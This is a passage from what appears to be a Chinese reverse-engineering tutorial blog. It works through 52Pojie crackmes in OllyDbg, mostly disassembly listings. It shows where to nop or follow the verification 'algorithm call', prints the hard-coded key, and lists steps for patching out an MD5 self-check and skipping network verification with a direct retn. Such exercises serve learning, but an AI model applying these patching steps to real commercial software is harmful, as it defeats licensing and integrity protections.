class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00402A60  /.  55                    push    ebp</span><br><span class=\"line\">00402A61  |.  8BEC                  mov     ebp,esp</span><br><span class=\"line\">00402A63  |.  6A FF                 push    -0x1</span><br><span class=\"line\">00402A65  |.  68 FB385300           push    005338FB</span><br><span class=\"line\">00402A6A  |.  64:A1 00000000        mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00402A70  |.  50                    push    eax</span><br><span class=\"line\">00402A71  |.  81EC 1C010000         sub     esp,0x11C</span><br><span class=\"line\">00402A77  |.  A1 B0275900           mov     eax,dword ptr ds:[0x5927B0]</span><br><span class=\"line\">00402A7C  |.  33C5                  xor     eax,ebp</span><br><span class=\"line\">00402A7E  |.  8945 F0               mov     [local.4],eax</span><br><span class=\"line\">00402A81  |.  53                    push    ebx</span><br><span class=\"line\">00402A82  |.  56                    push    esi</span><br><span class=\"line\">00402A83  |.  57                    push    edi</span><br><span class=\"line\">00402A84  |.  50                    push    eax</span><br><span class=\"line\">00402A85  |.  8D45 F4               lea     eax,[local.3]</span><br><span class=\"line\">00402A88  |.  64:A3 00000000        mov     dword ptr fs:[0],eax</span><br><span class=\"line\">00402A8E  |.  8BF9                  mov     edi,ecx</span><br><span class=\"line\">00402A90  |.  89BD E4FEFFFF         mov     [local.71],edi</span><br><span class=\"line\">00402A96  |.  E8 2E4B0000           call    004075C9</span><br><span class=\"line\">00402A9B  |.  FFB7 B8000000         push    dword ptr ds:[edi+0xB8]                            ; /lParam</span><br><span class=\"line\">00402AA1  |.  8B35 44385400         mov     esi,dword ptr ds:[&lt;&amp;USER32.SendMessageA&gt;]          ; |user32.SendMessageA</span><br><span class=\"line\">00402AA7  |.  6A 01                 push    0x1                                                ; |wParam = 0x1</span><br><span class=\"line\">00402AA9  |.  68 80000000           push    0x80                                               ; |Message = WM_SETICON</span><br><span class=\"line\">00402AAE  |.  FF77 20               push    dword ptr ds:[edi+0x20]                            ; |hWnd</span><br><span class=\"line\">00402AB1  |.  FFD6                  call    esi                                                ; \\SendMessageA</span><br><span class=\"line\">00402AB3  |.  FFB7 B8000000         push    dword ptr ds:[edi+0xB8]                            ; /lParam</span><br><span class=\"line\">00402AB9  |.  6A 00                 push    0x0                                                ; |wParam = 0x0</span><br><span class=\"line\">00402ABB  |.  68 80000000           push    0x80                                               ; |Message = WM_SETICON</span><br><span class=\"line\">00402AC0  |.  FF77 20               push    dword ptr ds:[edi+0x20]                            ; |hWnd</span><br><span class=\"line\">00402AC3  |.  FFD6                  call    esi                                                ; \\SendMessageA</span><br><span class=\"line\">00402AC5  |.  68 04010000           push    0x104</span><br><span class=\"line\">00402ACA  |.  33DB                  xor     ebx,ebx</span><br><span class=\"line\">00402ACC  |.  8D85 ECFEFFFF         lea     eax,[local.69]</span><br><span class=\"line\">00402AD2  |.  53                    push    ebx</span><br><span class=\"line\">00402AD3  |.  50                    push    eax</span><br><span class=\"line\">00402AD4  |.  E8 E7971100           call    0051C2C0</span><br><span class=\"line\">00402AD9  |.  83C4 0C               add     esp,0xC</span><br><span class=\"line\">00402ADC  |.  8D85 ECFEFFFF         lea     eax,[local.69]</span><br><span class=\"line\">00402AE2  |.  50                    push    eax                                                ; /Buffer</span><br><span class=\"line\">00402AE3  |.  68 04010000           push    0x104                                              ; |BufSize = 104 (260.)</span><br><span class=\"line\">00402AE8  |.  FF15 14345400         call    dword ptr ds:[&lt;&amp;KERNEL32.GetCurrentDirectoryA&gt;]    ; \\GetCurrentDirectoryA</span><br><span class=\"line\">00402AEE  |.  8D85 ECFEFFFF         lea     eax,[local.69]</span><br><span class=\"line\">00402AF4  |.  50                    push    eax</span><br><span class=\"line\">00402AF5  |.  8DB7 BC000000         lea     esi,dword ptr ds:[edi+0xBC]</span><br><span class=\"line\">00402AFB  |.  68 D8455400           push    005445D8                                           ;  %s\\52Pojie.txt</span><br><span class=\"line\">00402B00  |.  56                    push    esi</span><br><span class=\"line\">00402B01  |.  E8 8AE9FFFF           call    00401490\t\t\t\t\t\t\t\t\t\t;  CString 拼接函数</span><br><span class=\"line\">00402B06  |.  8D8D ECFEFFFF         lea     ecx,[local.69]</span><br><span class=\"line\">00402B0C  |.  51                    push    ecx</span><br><span class=\"line\">00402B0D  |.  8D87 C0000000         lea     eax,dword ptr ds:[edi+0xC0]</span><br><span class=\"line\">00402B13  |.  68 E8455400           push    005445E8                                           ;  %s\\52Pojie.ini</span><br><span class=\"line\">00402B18  |.  50                    push    eax</span><br><span class=\"line\">00402B19  |.  8985 E0FEFFFF         mov     [local.72],eax</span><br><span class=\"line\">00402B1F  |.  E8 6CE9FFFF           call    00401490</span><br><span class=\"line\">00402B24  |.  8D87 C4000000         lea     eax,dword ptr ds:[edi+0xC4]</span><br><span class=\"line\">00402B2A  |.  68 F8455400           push    005445F8                                           ;  Software\\52Pojie</span><br><span class=\"line\">00402B2F  |.  50                    push    eax</span><br><span class=\"line\">00402B30  |.  E8 5BE9FFFF           call    00401490</span><br><span class=\"line\">00402B35  |.  83C4 20               add     esp,0x20</span><br><span class=\"line\">00402B38  |.  8D87 3C010000         lea     eax,dword ptr ds:[edi+0x13C]</span><br><span class=\"line\">00402B3E  |.  68 0C465400           push    0054460C                                           ;  验证失败</span><br><span class=\"line\">00402B43  |.  8BC8                  mov     ecx,eax</span><br><span class=\"line\">00402B45  |.  8985 DCFEFFFF         mov     [local.73],eax</span><br><span class=\"line\">00402B4B  |.  E8 70990100           call    0041C4C0                                           ;  标签初始化</span><br><span class=\"line\">00402B50  |.  8D8F B0010000         lea     ecx,dword ptr ds:[edi+0x1B0]</span><br><span class=\"line\">00402B56  |.  68 0C465400           push    0054460C                                           ;  验证失败</span><br><span class=\"line\">00402B5B  |.  E8 60990100           call    0041C4C0</span><br><span class=\"line\">00402B60  |.  8D8F 24020000         lea     ecx,dword ptr ds:[edi+0x224]</span><br><span class=\"line\">00402B66  |.  68 0C465400           push    0054460C                                           ;  验证失败</span><br><span class=\"line\">00402B6B  |.  E8 50990100           call    0041C4C0</span><br><span class=\"line\">00402B70  |.  8B06                  mov     eax,dword ptr ds:[esi]</span><br><span class=\"line\">00402B72  |.  83E8 10               sub     eax,0x10</span><br><span class=\"line\">00402B75  |.  50                    push    eax</span><br><span class=\"line\">00402B76  |.  E8 F5F3FFFF           call    00401F70</span><br><span class=\"line\">00402B7B  |.  83C4 04               add     esp,0x4</span><br><span class=\"line\">00402B7E  |.  8D70 10               lea     esi,dword ptr ds:[eax+0x10]</span><br><span class=\"line\">00402B81  |.  56                    push    esi                                                ; /FileName</span><br><span class=\"line\">00402B82  |.  FF15 0C345400         call    dword ptr ds:[&lt;&amp;KERNEL32.GetFileAttributesA&gt;]      ; \\GetFileAttributesA</span><br><span class=\"line\">00402B88  |.  33C9                  xor     ecx,ecx</span><br><span class=\"line\">00402B8A  |.  83F8 FF               cmp     eax,-0x1                                           ;  判断文件是否存在</span><br><span class=\"line\">00402B8D  |.  0F95C1                setne   cl</span><br><span class=\"line\">00402B90  |.  83C6 F0               add     esi,-0x10</span><br><span class=\"line\">00402B93  |.  83CF FF               or      edi,0xFFFFFFFF</span><br><span class=\"line\">00402B96  |.  8BC7                  mov     eax,edi</span><br><span class=\"line\">00402B98  |.  898D E8FEFFFF         mov     [local.70],ecx</span><br><span class=\"line\">00402B9E  |.  8D4E 0C               lea     ecx,dword ptr ds:[esi+0xC]</span><br><span class=\"line\">00402BA1  |.  F0:0FC101             lock xadd dword ptr ds:[ecx],eax</span><br><span class=\"line\">00402BA5  |.  48                    dec     eax</span><br><span class=\"line\">00402BA6  |.  85C0                  test    eax,eax</span><br><span class=\"line\">00402BA8  |.  7F 08                 jg      short 00402BB2</span><br><span class=\"line\">00402BAA  |.  8B0E                  mov     ecx,dword ptr ds:[esi]</span><br><span class=\"line\">00402BAC  |.  56                    push    esi</span><br><span class=\"line\">00402BAD  |.  8B01                  mov     eax,dword ptr ds:[ecx]</span><br><span class=\"line\">00402BAF  |.  FF50 04               call    dword ptr ds:[eax+0x4]</span><br><span class=\"line\">00402BB2  |&gt;  399D E8FEFFFF         cmp     [local.70],ebx</span><br><span class=\"line\">00402BB8  |.  74 24                 je      short 00402BDE\t\t\t\t\t\t\t\t\t;  nop 掉，或者跟入算法call</span><br><span class=\"line\">00402BBA  |.  8B8D E4FEFFFF         mov     ecx,[local.71]</span><br><span class=\"line\">00402BC0  |.  E8 1BF4FFFF           call    00401FE0                                           ;  算法call</span><br><span class=\"line\">00402BC5  |.  85C0                  test    eax,eax</span><br><span class=\"line\">00402BC7  |.  74 15                 je      short 00402BDE</span><br><span class=\"line\">00402BC9  |.  8B8D DCFEFFFF         mov     ecx,[local.73]</span><br><span class=\"line\">00402BCF  |.  68 18465400           push    00544618                                           ;  验证通过</span><br><span class=\"line\">00402BD4  |.  E8 E7980100           call    0041C4C0</span><br><span class=\"line\">00402BD9  |.  BB 01000000           mov     ebx,0x1</span><br><span class=\"line\">00402BDE  |&gt;  8B85 E0FEFFFF         mov     eax,[local.72]</span><br><span class=\"line\">00402BE4  |.  8B00                  mov     eax,dword ptr ds:[eax]</span><br><span class=\"line\">00402BE6  |.  83E8 10               sub     eax,0x10</span><br><span class=\"line\">00402BE9  |.  50                    push    eax</span><br><span class=\"line\">00402BEA  |.  E8 81F3FFFF           call    00401F70</span><br><span class=\"line\">00402BEF  |.  83C4 04               add     esp,0x4</span><br><span class=\"line\">00402BF2  |.  8D70 10               lea     esi,dword ptr ds:[eax+0x10]</span><br><span class=\"line\">00402BF5  |.  56                    push    esi                                                ; /FileName</span><br><span class=\"line\">00402BF6  |.  FF15 0C345400         call    dword ptr ds:[&lt;&amp;KERNEL32.GetFileAttributesA&gt;]      ; \\GetFileAttributesA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># 算法call</span><br><span class=\"line\">00401FE0  |$  55                    push    ebp</span><br><span class=\"line\">00401FE1  |.  8BEC                  mov     ebp,esp</span><br><span class=\"line\">00401FE3  |.  81EC 10010000         sub     esp,0x110</span><br><span class=\"line\">00401FE9  |.  A1 B0275900           mov     eax,dword ptr ds:[0x5927B0]</span><br><span class=\"line\">00401FEE  |.  33C5                  xor     eax,ebp</span><br><span class=\"line\">00401FF0  |.  8945 FC               mov     [local.1],eax</span><br><span class=\"line\">00401FF3  |.  56                    push    esi</span><br><span class=\"line\">00401FF4  |.  57                    push    edi</span><br><span class=\"line\">00401FF5  |.  33F6                  xor     esi,esi</span><br><span class=\"line\">00401FF7  |.  56                    push    esi                                                ; /hTemplateFile =&gt; NULL</span><br><span class=\"line\">00401FF8  |.  56                    push    esi                                                ; |Attributes =&gt; 0</span><br><span class=\"line\">00401FF9  |.  6A 03                 push    0x3                                                ; |Mode = OPEN_EXISTING</span><br><span class=\"line\">00401FFB  |.  56                    push    esi                                                ; |pSecurity =&gt; NULL</span><br><span class=\"line\">00401FFC  |.  6A 01                 push    0x1                                                ; |ShareMode = FILE_SHARE_READ</span><br><span class=\"line\">00401FFE  |.  6A 01                 push    0x1                                                ; |Access = 1</span><br><span class=\"line\">00402000  |.  FFB1 BC000000         push    dword ptr ds:[ecx+0xBC]                            ; |FileName</span><br><span class=\"line\">00402006  |.  FF15 10345400         call    dword ptr ds:[&lt;&amp;KERNEL32.CreateFileA&gt;]             ; \\CreateFileA</span><br><span class=\"line\">0040200C  |.  8BF8                  mov     edi,eax</span><br><span class=\"line\">0040200E  |.  83FF FF               cmp     edi,-0x1</span><br><span class=\"line\">00402011  |.  0F84 7F000000         je      00402096</span><br><span class=\"line\">00402017  |.  68 04010000           push    0x104</span><br><span class=\"line\">0040201C  |.  8D85 F5FEFFFF         lea     eax,dword ptr ss:[ebp-0x10B]</span><br><span class=\"line\">00402022  |.  56                    push    esi</span><br><span class=\"line\">00402023  |.  50                    push    eax</span><br><span class=\"line\">00402024  |.  C685 F4FEFFFF 00      mov     byte ptr ss:[ebp-0x10C],0x0</span><br><span class=\"line\">0040202B  |.  E8 90A21100           call    0051C2C0</span><br><span class=\"line\">00402030  |.  83C4 0C               add     esp,0xC</span><br><span class=\"line\">00402033  |.  8D85 F0FEFFFF         lea     eax,[local.68]</span><br><span class=\"line\">00402039  |.  56                    push    esi                                                ; /pOverlapped</span><br><span class=\"line\">0040203A  |.  50                    push    eax                                                ; |pBytesRead</span><br><span class=\"line\">0040203B  |.  68 04010000           push    0x104                                              ; |BytesToRead = 104 (260.)</span><br><span class=\"line\">00402040  |.  8D85 F4FEFFFF         lea     eax,[local.67]                                     ; |</span><br><span class=\"line\">00402046  |.  50                    push    eax                                                ; |Buffer</span><br><span class=\"line\">00402047  |.  57                    push    edi                                                ; |hFile</span><br><span class=\"line\">00402048  |.  FF15 28345400         call    dword ptr ds:[&lt;&amp;KERNEL32.ReadFile&gt;]                ; \\ReadFile</span><br><span class=\"line\">0040204E  |.  85C0                  test    eax,eax</span><br><span class=\"line\">00402050  |.  74 3D                 je      short 0040208F</span><br><span class=\"line\">00402052  |.  B9 24465400           mov     ecx,00544624                                       ;  JXU2MjExJXU2</span><br><span class=\"line\">00402057  |.  8D85 F4FEFFFF         lea     eax,[local.67]</span><br><span class=\"line\">0040205D  |.  8D49 00               lea     ecx,dword ptr ds:[ecx]</span><br><span class=\"line\">00402060  |&gt;  8A10                  /mov     dl,byte ptr ds:[eax]                              ;  strcmp</span><br><span class=\"line\">00402062  |.  3A11                  |cmp     dl,byte ptr ds:[ecx]</span><br><span class=\"line\">00402064  |.  75 1A                 |jnz     short 00402080</span><br><span class=\"line\">00402066  |.  84D2                  |test    dl,dl</span><br><span class=\"line\">00402068  |.  74 12                 |je      short 0040207C</span><br><span class=\"line\">0040206A  |.  8A50 01               |mov     dl,byte ptr ds:[eax+0x1]</span><br><span class=\"line\">0040206D  |.  3A51 01               |cmp     dl,byte ptr ds:[ecx+0x1]</span><br><span class=\"line\">00402070  |.  75 0E                 |jnz     short 00402080</span><br><span class=\"line\">00402072  |.  83C0 02               |add     eax,0x2</span><br><span class=\"line\">00402075  |.  83C1 02               |add     ecx,0x2</span><br><span class=\"line\">00402078  |.  84D2                  |test    dl,dl</span><br><span class=\"line\">0040207A  |.^ 75 E4                 \\jnz     short 00402060</span><br><span class=\"line\">0040207C  |&gt;  33C0                  xor     eax,eax</span><br><span class=\"line\">0040207E  |.  EB 05                 jmp     short 00402085</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>我们可以爆破跳过验证环节，也可以跟入算法 call 找到真正的验证码</p>\n<h3 id=\"写入到ini\"><a class=\"markdownIt-Anchor\" href=\"#写入到ini\">#</a> 写入到 ini</h3>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00402820  /.  55                    push    ebp</span><br><span class=\"line\">00402821  |.  8BEC                  mov     ebp,esp</span><br><span class=\"line\">00402823  |.  6A FF                 push    -0x1</span><br><span class=\"line\">00402825  |.  68 98385300           push    00533898</span><br><span class=\"line\">0040282A  |.  64:A1 00000000        mov     eax,dword ptr fs:[0]</span><br><span class=\"line\">00402830  |.  50                    push    eax</span><br><span class=\"line\">00402831  |.  83EC 08               sub     esp,0x8</span><br><span class=\"line\">00402834  |.  A1 B0275900           mov     eax,dword ptr ds:[0x5927B0]</span><br><span class=\"line\">00402839  |.  33C5                  xor     eax,ebp</span><br><span class=\"line\">0040283B  |.  8945 F0               mov     [local.4],eax</span><br><span class=\"line\">0040283E  |.  56                    push    esi</span><br><span class=\"line\">0040283F  |.  50                    push    eax</span><br><span class=\"line\">00402840  |.  8D45 F4               lea     eax,[local.3]</span><br><span class=\"line\">00402843  |.  64:A3 00000000        mov     dword ptr fs:[0],eax</span><br><span class=\"line\">00402849  |.  8BF1                  mov     esi,ecx</span><br><span class=\"line\">0040284B  |.  C745 EC 00000000      mov     [local.5],0x0</span><br><span class=\"line\">00402852  |.  E8 46260000           call    00404E9D</span><br><span class=\"line\">00402857  |.  33D2                  xor     edx,edx</span><br><span class=\"line\">00402859  |.  8BC8                  mov     ecx,eax</span><br><span class=\"line\">0040285B  |.  85C9                  test    ecx,ecx</span><br><span class=\"line\">0040285D  |.  0F95C2                setne   dl</span><br><span class=\"line\">00402860  |.  85D2                  test    edx,edx</span><br><span class=\"line\">00402862  |.  75 0A                 jnz     short 0040286E</span><br><span class=\"line\">00402864  |.  68 05400080           push    0x80004005</span><br><span class=\"line\">00402869  |.  E8 82EBFFFF           call    004013F0</span><br><span class=\"line\">0040286E  |&gt;  8B01                  mov     eax,dword ptr ds:[ecx]</span><br><span class=\"line\">00402870  |.  FF50 0C               call    dword ptr ds:[eax+0xC]</span><br><span class=\"line\">00402873  |.  83C0 10               add     eax,0x10</span><br><span class=\"line\">00402876  |.  8945 EC               mov     [local.5],eax</span><br><span class=\"line\">00402879  |.  8D45 EC               lea     eax,[local.5]</span><br><span class=\"line\">0040287C  |.  50                    push    eax</span><br><span class=\"line\">0040287D  |.  8D8E C8000000         lea     ecx,dword ptr ds:[esi+0xC8]</span><br><span class=\"line\">00402883  |.  C745 FC 00000000      mov     [local.1],0x0</span><br><span class=\"line\">0040288A  |.  E8 99580100           call    00418128                                                    ;  获取输入</span><br><span class=\"line\">0040288F  |.  8B45 EC               mov     eax,[local.5]</span><br><span class=\"line\">00402892  |.  8378 F4 00            cmp     dword ptr ds:[eax-0xC],0x0</span><br><span class=\"line\">00402896  |.  74 51                 je      short 004028E9                                              ;  输入为空直接结束</span><br><span class=\"line\">00402898  |.  8B48 F8               mov     ecx,dword ptr ds:[eax-0x8]</span><br><span class=\"line\">0040289B  |.  8BB6 C0000000         mov     esi,dword ptr ds:[esi+0xC0]</span><br><span class=\"line\">004028A1  |.  BA 01000000           mov     edx,0x1</span><br><span class=\"line\">004028A6  |.  2B50 FC               sub     edx,dword ptr ds:[eax-0x4]</span><br><span class=\"line\">004028A9  |.  0BCA                  or      ecx,edx</span><br><span class=\"line\">004028AB  |.  7D 0D                 jge     short 004028BA</span><br><span class=\"line\">004028AD  |.  6A 00                 push    0x0</span><br><span class=\"line\">004028AF  |.  8D4D EC               lea     ecx,[local.5]</span><br><span class=\"line\">004028B2  |.  E8 A9EDFFFF           call    00401660</span><br><span class=\"line\">004028B7  |.  8B45 EC               mov     eax,[local.5]</span><br><span class=\"line\">004028BA  |&gt;  56                    push    esi                                                         ; /FileName</span><br><span class=\"line\">004028BB  |.  50                    push    eax                                                         ; |String</span><br><span class=\"line\">004028BC  |.  68 34465400           push    00544634                                                    ; |Key</span><br><span class=\"line\">004028C1  |.  68 38465400           push    00544638                                                    ; |验证</span><br><span class=\"line\">004028C6  |.  FF15 18345400         call    dword ptr ds:[&lt;&amp;KERNEL32.WritePrivateProfileStringA&gt;]       ; \\WritePrivateProfileStringA</span><br><span class=\"line\">004028CC  |.  85C0                  test    eax,eax                                                     ;  写文件</span><br><span class=\"line\">004028CE  |.  74 16                 je      short 004028E6</span><br><span class=\"line\">004028D0  |.  6A 00                 push    0x0</span><br><span class=\"line\">004028D2  |.  6A 00                 push    0x0</span><br><span class=\"line\">004028D4  |.  68 7C465400           push    0054467C                                                    ;  你选择的验证类型是重启验证2</span><br><span class=\"line\">004028D9  |.  E8 A17E0000           call    0040A77F                                                    ;  弹窗</span><br><span class=\"line\">004028DE  |.  6A 00                 push    0x0                                                         ; /ExitCode = 0x0</span><br><span class=\"line\">004028E0  |.  FF15 40385400         call    dword ptr ds:[&lt;&amp;USER32.PostQuitMessage&gt;]                    ; \\PostQuitMessage</span><br><span class=\"line\">004028E6  |&gt;  8B45 EC               mov     eax,[local.5]</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>或者通过给函数下段也，也能断下来</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821222933923.png\" alt=\"image-20230821222933923\"></p>\n<h3 id=\"写入注册表\"><a class=\"markdownIt-Anchor\" href=\"#写入注册表\">#</a> 写入注册表</h3>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821223559082.png\" alt=\"image-20230821223559082\"></p>\n<p>通过下段找到写入和读取注册表的地方，读取注册表就是算法 call</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821223930345.png\" alt=\"image-20230821223930345\"></p>\n<p>下段记得下的是 ExA</p>\n<p>JXU2MjExJXU2</p>\n<p>NjJGJXU3NTI</p>\n<p>4JXU2MjM3</p>\n<h1 id=\"破解程序自校验md5\"><a class=\"markdownIt-Anchor\" href=\"#破解程序自校验md5\">#</a> 破解程序自校验 (md5)</h1>\n<p>1. 搜索字符串，找到关键字符串，比如注册，激活，通过 xx</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820151928757.png\" alt=\"image-20230820151928757\"></p>\n<p>2、在关键字符串所在函数处下段</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820151949493.png\" alt=\"image-20230820151949493\"></p>\n<p>3. 运行程序，点击注册，使程序断下来</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820152059610.png\" alt=\"image-20230820152059610\"></p>\n<p>4. 搜索常量，找到有哪些位置访问了这个常量</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820152736054.png\" alt=\"image-20230820152736054\"></p>\n<p>5. 对所有下段，找到常量的赋值点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820152806264.png\" alt=\"image-20230820152806264\"></p>\n<p>6. 重新运行程序，程序被断在，说明此处可能对上面说的常量做了改变</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820153407165.png\" alt=\"image-20230820153407165\"></p>\n<p>7. 第一处关键点：会对前两个字符做验证，是否为 02</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820193839511.png\" alt=\"image-20230820193839511\"></p>\n<p>8. 第二处关键点：sn 判断 call 跟进去</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820193956146.png\" alt=\"image-20230820193956146\"></p>\n<p>9.sn 判断</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820194328180.png\" alt=\"image-20230820194328180\"></p>\n<p>10. 跳过网络验证</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820194548582.png\" alt=\"image-20230820194548582\"></p>\n<p>11. 找到验证函数最开始，直接 retn</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230820194627641.png\" alt=\"image-20230820194627641\"></p>\n<p>12. 去除自校验。对 delphi 程序下按键断点，去除无关断点，点击任意触发断点</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821165626093.png\" alt=\"image-20230821165626093\"></p>\n<p>F7 进入函数，逐个函数跟踪</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821165708555.png\" alt=\"image-20230821165708555\"></p>\n<p>跟入第一个 call 4b2dc0</p>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230821165755920.png\" alt=\"image-20230821165755920\"></p>\n<p>跟入 4B1F34</p>\n<p>跟入 4B1F6A</p>\n<p><img 